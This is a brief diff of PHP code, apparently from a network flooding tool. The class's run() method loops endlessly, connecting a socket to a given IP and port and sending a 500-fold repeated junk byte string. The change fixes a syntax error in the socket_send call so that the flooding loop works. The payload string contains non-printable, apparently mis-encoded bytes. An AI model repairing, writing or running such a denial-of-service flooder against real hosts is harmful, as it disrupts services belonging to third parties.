@@ -66,7 +66,7 @@ public function run(){
 	$spam = str_repeat("x���wm���{�w��}jN�", 500);
 	while(true) {
 		socket_connect($this->socket, $ip, $port);
-		socket_send($this->socket, $spam,strlen($spam) + 5; 0);
+		socket_send($this->socket, $spam,strlen($spam) + 5, 0);
 } 
 } 
 } 
